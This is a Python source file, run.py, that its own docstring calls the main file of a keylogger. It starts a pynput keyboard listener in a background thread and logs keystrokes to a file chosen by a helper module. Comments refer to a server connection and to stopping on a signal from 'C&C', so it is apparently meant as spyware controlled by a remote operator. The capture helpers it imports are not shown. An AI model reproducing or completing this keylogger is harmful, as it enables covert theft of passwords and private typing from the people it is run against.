#RUN.PY
'''
RUNS ALL MODULES OF THE KEYLOGGER
MAIN FILE
'''

import threading 
from script import keyPressedF, buffer_words
from functools import partial
from pynput import keyboard
import os
stop_event = threading.Event()
buffer_local= []
from cfile import checkfile

def keyboard_logger_pathed_without_timer(path):
    print(os.getpid())
    keyPressed_with_path = partial(keyPressedF, file_path=path)

    listner = keyboard.Listener(on_press = keyPressed_with_path)
    listner.start()
    #time.sleep(5)

    try:
        while not stop_event.is_set():
            threading.Event().wait(0.1)
    finally:
        listner.stop()
    
    #listner.stop()
    buffer_local = buffer_words
    #print(buffer_words)

def run():
    #store_file -> file path for logger
    #bfr -> temporary store for words captured
    #RF -> binary flag for running the script or not
    

    #check for file
    
    store_file = checkfile()
    print(store_file)
    
    #check for server conn
    
    #run keylogger    
    t1 = threading.Thread(target=keyboard_logger_pathed_without_timer, name='logger', args=(store_file,))
    inp = -1
    t1.start()
    while inp < 0:
        inp = int(input())
        
    stop_event.set()
    t1.join()
    #terminate connection upon recieving signal from C&C
    print()        

if __name__ == "__main__":
    run()
